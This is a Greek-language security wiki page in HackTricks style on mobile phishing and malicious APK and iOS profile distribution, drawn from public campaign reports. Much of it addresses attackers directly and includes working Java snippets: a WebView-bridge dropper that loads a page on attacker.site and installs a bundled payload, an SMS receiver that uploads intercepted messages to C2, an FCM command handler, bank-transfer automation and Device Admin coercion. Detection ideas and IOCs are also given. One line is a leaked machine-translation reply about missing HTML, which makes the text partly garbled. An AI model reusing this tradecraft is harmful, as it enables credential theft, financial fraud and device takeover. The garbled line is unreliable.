# Phishing σε Κινητές Συσκευές & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι threat actors για τη διανομή **κακόβουλων Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.λπ.).
> Το υλικό προσαρμόζεται από την καμπάνια SarangTrap που αποκάλυψε η Zimperium zLabs (2025) και άλλες δημόσιες έρευνες.

## Ροή Επίθεσης

1. **SEO/Phishing Infrastructure**
* Καταχωρήστε δεκάδες look-alike domains (dating, cloud share, car service…).
– Χρησιμοποιήστε λέξεις-κλειδιά στη τοπική γλώσσα και emojis στο στοιχείο `<title>` για να αυξήσετε την κατάταξη στο Google.
– Φιλοξενήστε *και τα δύο* Android (`.apk`) και iOS οδηγίες εγκατάστασης στην ίδια landing page.
2. **First Stage Download**
* Android: απευθείας σύνδεσμος σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλό HTTPS link σε κακόβουλο **mobileconfig** profile (βλέπε παρακάτω).
3. **Post-install Social Engineering**
* Στην πρώτη εκτέλεση η εφαρμογή ζητάει έναν **invitation / verification code** (ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κωδικός **POSTed over HTTP** στο Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το malware συνεχίζει.
* Sandbox / AV δυναμική ανάλυση που δεν υποβάλλει ποτέ έγκυρο κωδικό δεν βλέπει **κακόβουλη συμπεριφορά** (evasion).
4. **Runtime Permission Abuse** (Android)
* Επικίνδυνα permissions ζητούνται μόνο **μετά από θετική απάντηση από το C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Πρόσφατες παραλλαγές **αφαιρούν το `<uses-permission>` για SMS από το `AndroidManifest.xml`** αλλά αφήνουν τη Java/Kotlin ροή που διαβάζει SMS μέσω reflection ⇒ μειώνει το static score ενώ παραμένει λειτουργικό σε συσκευές που χορηγούν το permission μέσω κατάχρησης `AppOps` ή παλαιότερων στόχων.
5. **Facade UI & Background Collection**
* Η εφαρμογή εμφανίζει αβλαβείς προβολές (SMS viewer, gallery picker) υλοποιημένες τοπικά.
* Εν τω μεταξύ εξάγει:
- IMEI / IMSI, αριθμό τηλεφώνου
- Πλήρες dump `ContactsContract` (JSON array)
- JPEG/PNG από `/sdcard/DCIM` συμπιεσμένα με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό περιεχόμενο SMS (`content://sms`)
Τα payloads είναι **batch-zipped** και στέλνονται μέσω `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Ένα μόνο **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε επιτήρηση τύπου “MDM”.
* Οδηγίες social-engineering:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ ο επιτιθέμενος αποκτά *Contacts* & *Photo* entitlement χωρίς έλεγχο App Store.
7. **Network Layer**
* Απλό HTTP, συχνά στην port 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολο να εντοπιστεί).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση malware, αυτοματοποιήστε το στάδιο του invitation code με Frida/Objection για να φτάσετε στον κακόβουλο κλάδο.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με runtime `PackageManager#getRequestedPermissions()`; η απουσία επικίνδυνων perms είναι κόκκινη σημαία.
* **Network Canary** – Διαμορφώστε `iptables -p tcp --dport 80 -j NFQUEUE` για να εντοπίσετε μη σταθερά bursts POST μετά την εισαγωγή του κωδικού.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` σε macOS για να εμφανίσετε το `PayloadContent` και να εντοπίσετε υπερβολικά entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** για να εντοπίζετε ξαφνικά κύματα domain πλούσια σε λέξεις-κλειδιά.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` από Dalvik clients εκτός Google Play.
* **Invite-code Telemetry** – POSTs 6–8 ψηφίων αριθμητικών κωδικών λίγο μετά την εγκατάσταση του APK μπορεί να υποδηλώνουν staging.
* **MobileConfig Signing** – Απορρίψτε unsigned configuration profiles μέσω πολιτικής MDM.

## Χρήσιμο Frida Snippet: Αυτόματη Παράκαμψη Κωδικού Πρόσκλησης
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Δείκτες (Γενικά)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Αυτό το pattern έχει παρατηρηθεί σε καμπάνιες που εκμεταλλεύονται θέματα κυβερνητικών επιδομάτων για να κλέψουν διαπιστευτήρια UPI και OTPs. Οι επιτιθέμενοι συνδέουν αξιόπιστες πλατφόρμες για παράδοση και ανθεκτικότητα.

### Delivery chain across trusted platforms
- YouTube video lure → η περιγραφή περιέχει έναν σύντομο σύνδεσμο
- Σύντομος σύνδεσμος → GitHub Pages phishing site που μιμείται το νόμιμο portal
- Το ίδιο GitHub repo φιλοξενεί ένα APK με ψεύτικο “Google Play” badge που οδηγεί απευθείας στο αρχείο
- Δυναμικές phishing pages φιλοξενούνται στο Replit· το κανάλι απομακρυσμένων εντολών χρησιμοποιεί Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Το πρώτο APK είναι ένας installer (dropper) που περιλαμβάνει το πραγματικό malware στο `assets/app.apk` και προτρέπει τον χρήστη να απενεργοποιήσει το Wi‑Fi/mobile data για να μειώσει την ανίχνευση στο cloud.
- Το embedded payload εγκαθίσταται με έναν αθώο τίτλο (π.χ., “Secure Update”). Μετά την εγκατάσταση, τόσο ο installer όσο και το payload υπάρχουν ως ξεχωριστές εφαρμογές.

Static triage tip (grep για embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Δυναμική ανακάλυψη endpoints μέσω shortlink
- Malware ανακτά μια plain-text, comma-separated λίστα ενεργών endpoints από ένα shortlink; απλές μετασχηματίσεις συμβολοσειράς παράγουν το τελικό phishing page path.

Παράδειγμα (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Συλλογή διαπιστευτηρίων UPI μέσω WebView
- Το βήμα “Make payment of ₹1 / UPI‑Lite” φορτώνει μια κακόβουλη HTML φόρμα από το δυναμικό endpoint μέσα σε ένα WebView και καταγράφει ευαίσθητα πεδία (τηλέφωνο, τράπεζα, UPI PIN) τα οποία γίνονται `POST` σε `addup.php`.

Ελάχιστος loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Ζητούνται επιθετικές άδειες κατά την πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές χρησιμοποιούνται σε βρόχο για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Οι εισερχόμενες SMS υποκλέπτονται από broadcast receiver και ανεβαίνουν με μεταδεδομένα (sender, body, SIM slot, per-device random ID) στο `/addsm.php`.

Σκίτσο του receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Το payload εγγράφεται στο FCM· τα push μηνύματα φέρουν ένα πεδίο `_type` που χρησιμοποιείται ως διακόπτης για να ενεργοποιήσει ενέργειες (π.χ., ενημέρωση προτύπων κειμένου phishing, εναλλαγή συμπεριφορών).

Παράδειγμα FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler σκίτσο:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Πρότυπα ανίχνευσης και IOCs
- Το APK περιέχει δευτερεύον payload στο `assets/app.apk`
- Η WebView φορτώνει στοιχεία πληρωμής από το `gate.htm` και exfiltrates στο `/addup.php`
- SMS exfiltration στο `/addsm.php`
- Shortlink-driven config fetch (π.χ. `rebrand.ly/*`) που επιστρέφει CSV endpoints
- Εφαρμογές με ετικέτα γενικά “Update/Secure Update”
- FCM `data` μηνύματα με διακριτή `_type` σε μη αξιόπιστες εφαρμογές

### Ιδέες εντοπισμού & άμυνας
- Σηματοδοτήστε εφαρμογές που ζητούν από χρήστες να απενεργοποιήσουν το δίκτυο κατά την εγκατάσταση και στη συνέχεια side-load δεύτερο APK από το `assets/`.
- Ειδοποίηση για το tuple δικαιωμάτων: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Egress monitoring για `POST /addup.php|/addsm.php` σε μη-corporate hosts· μπλοκάρετε γνωστή infrastructure.
- Κανόνες Mobile EDR: μη αξιόπιστη εφαρμογή που εγγράφεται για FCM και διακλαδίζεται με βάση το πεδίο `_type`.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Η καμπάνια RatOn banker/RAT (ThreatFabric) αποτελεί ένα συγκεκριμένο παράδειγμα του πώς οι σύγχρονες mobile phishing επιχειρήσεις συνδυάζουν WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), κατάληψη crypto wallets, και ακόμη NFC-relay orchestration. Αυτή η ενότητα αφαιρεί μια περίληψη των επαναχρησιμοποιήσιμων τεχνικών.

### Στάδιο-1: WebView → native install bridge (dropper)
Οι επιτιθέμενοι παρουσιάζουν μια WebView που δείχνει σε σελίδα του attacker και εισάγουν ένα JavaScript interface που εκθέτει έναν native installer. Ένα πάτημα σε ένα HTML button καλεί native κώδικα που εγκαθιστά ένα δεύτερο στάδιο APK bundled στα assets του dropper και στη συνέχεια το εκκινεί απευθείας.

Ελάχιστο μοτίβο:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Δεν παρείχατε το HTML. Παρακαλώ επικολλήστε το περιεχόμενο της σελίδας (HTML/markdown) που θέλετε να μεταφραστεί στα Ελληνικά και θα το μεταφράσω διατηρώντας ανέπαφα τα tags, συνδέσμους, paths και markdown όπως ζητήθηκε.
```html
<button onclick="bridge.installApk()">Install</button>
```
Μετά την εγκατάσταση, το dropper εκκινεί το payload μέσω explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ιδέα ανίχνευσης: μη αξιόπιστες εφαρμογές που καλούν `addJavascriptInterface()` και εκθέτουν μεθόδους τύπου installer στο WebView; APK που μεταφέρει ενσωματωμένο δευτερεύον payload κάτω από το `assets/` και καλεί την Package Installer Session API.

### Διαδρομή συναίνεσης: Accessibility + Device Admin + follow-on runtime prompts
Το Stage-2 ανοίγει ένα WebView που φιλοξενεί μια σελίδα “Access”. Το κουμπί της καλεί μια exported μέθοδο που πλοηγεί το θύμα στις ρυθμίσεις Accessibility και ζητά την ενεργοποίηση της rogue υπηρεσίας. Μόλις δοθεί, το malware χρησιμοποιεί το Accessibility για να πατήσει αυτόματα μέσα από τους επόμενους διαλόγους runtime permission (contacts, overlay, manage system settings, κ.λπ.) και να ζητήσει Device Admin.

- Το Accessibility προγραμματιστικά βοηθά στην αποδοχή μετέπειτα προτροπών εντοπίζοντας κουμπιά όπως “Allow”/“OK” στο node-tree και αποστέλλοντας κλικ.
- Έλεγχος/αίτηση για overlay permission:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Δείτε επίσης:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Οι χειριστές μπορούν να εκδώσουν εντολές για:
- εμφανίσουν ένα overlay πλήρους οθόνης από ένα URL, ή
- περάσουν inline HTML που φορτώνεται σε overlay WebView.

Πιθανοί τρόποι χρήσης: coercion (εισαγωγή PIN), άνοιγμα wallet για την καταγραφή PINs, μηνύματα εκβίασης. Κρατήστε μια εντολή για να εξασφαλίσετε ότι η άδεια overlay είναι χορηγημένη αν λείπει.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: περιοδικά εξάγετε το Accessibility node tree, σειριοποιήστε τα ορατά κείμενα/ρόλους/όρια και στείλτε στο C2 ως pseudo-screen (εντολές όπως `txt_screen` μία φορά και `screen_live` συνεχώς).
- High-fidelity: ζητήστε MediaProjection και ξεκινήστε screen-casting/recording κατ’ απαίτηση (εντολές όπως `display` / `record`).

### ATS playbook (αυτοματισμός εφαρμογής τράπεζας)
Δεδομένου ενός JSON task, ανοίξτε την εφαρμογή τράπεζας, χειριστείτε το UI μέσω Accessibility με έναν συνδυασμό ερωτημάτων κειμένου και taps σε συντεταγμένες, και εισάγετε το payment PIN του θύματος όταν ζητηθεί.

Παράδειγμα εργασίας:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Νέα πληρωμή"
- "Zadat platbu" → "Εισαγωγή πληρωμής"
- "Nový příjemce" → "Νέος παραλήπτης"
- "Domácí číslo účtu" → "Αριθμός εγχώριου λογαριασμού"
- "Další" → "Επόμενο"
- "Odeslat" → "Αποστολή"
- "Ano, pokračovat" → "Ναι, συνέχισε"
- "Zaplatit" → "Πληρωμή"
- "Hotovo" → "Ολοκληρώθηκε"

Οι χειριστές μπορούν επίσης να ελέγξουν/αυξήσουν τα όρια μεταφοράς μέσω εντολών όπως `check_limit` και `limit` που πλοηγούνται στην limits UI με παρόμοιο τρόπο.

### Crypto wallet seed extraction
Στόχοι όπως οι MetaMask, Trust Wallet, Blockchain.com, Phantom. Ροή: ξεκλείδωμα (κλεμμένο PIN ή παρεχόμενος κωδικός πρόσβασης), μεταβείτε στο Security/Recovery, αποκάλυψη/εμφάνιση seed phrase, keylog/exfiltrate το. Υλοποιήστε locale-aware selectors (EN/RU/CZ/SK) για να σταθεροποιήσετε την πλοήγηση ανάμεσα σε γλώσσες.

### Device Admin coercion
Τα Device Admin APIs χρησιμοποιούνται για να αυξήσουν τις ευκαιρίες καταγραφής PIN και να δυσκολέψουν το θύμα:

- Άμεσο κλείδωμα:
```java
dpm.lockNow();
```
- Λήξη του τρέχοντος διαπιστευτηρίου για να επιβληθεί αλλαγή (Accessibility καταγράφει νέο PIN/συνθηματικό):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Αναγκάστε μη-biometric ξεκλείδωμα απενεργοποιώντας τα χαρακτηριστικά biometric του keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Σημείωση: Πολλοί έλεγχοι του DevicePolicyManager απαιτούν Device Owner/Profile Owner σε πρόσφατες εκδόσεις Android· ορισμένα builds από OEM μπορεί να είναι επιεική. Πάντα επικυρώνετε στο στοχευόμενο OS/OEM.

### Ορχήστρωση NFC relay (NFSkate)
Stage-3 μπορεί να εγκαταστήσει και να εκκινήσει ένα εξωτερικό NFC-relay module (π.χ. NFSkate) και ακόμα να του παραδώσει ένα HTML template για να καθοδηγήσει το θύμα κατά τη διάρκεια του relay. Αυτό επιτρέπει contactless card-present cash-out παράλληλα με online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Σετ εντολών operator (παράδειγμα)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ιδέες ανίχνευσης & άμυνας (RatOn-style)
- Εντοπίστε WebViews με `addJavascriptInterface()` που εκθέτουν installer/permission methods· σελίδες που τελειώνουν σε “/access” και προκαλούν Accessibility prompts.
- Ειδοποίηση για apps που δημιουργούν υψηλό ρυθμό Accessibility gestures/clicks λίγο μετά τη χορήγηση πρόσβασης στην υπηρεσία· telemetry που μοιάζει με Accessibility node dumps αποστελλόμενα στο C2.
- Παρακολουθήστε αλλαγές πολιτικής Device Admin σε μη έμπιστες εφαρμογές: `lockNow`, password expiration, keyguard feature toggles.
- Ειδοποίηση για MediaProjection prompts από μη εταιρικές εφαρμογές ακολουθούμενα από περιοδικές frame uploads.
- Εντοπίστε εγκατάσταση/εκκίνηση εξωτερικής NFC-relay app που ενεργοποιείται από άλλη εφαρμογή.
- Για τραπεζικές εφαρμογές: επιβάλλετε out-of-band confirmations, biometrics-binding και transaction-limits ανθεκτικά σε on-device automation.

## Αναφορές

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
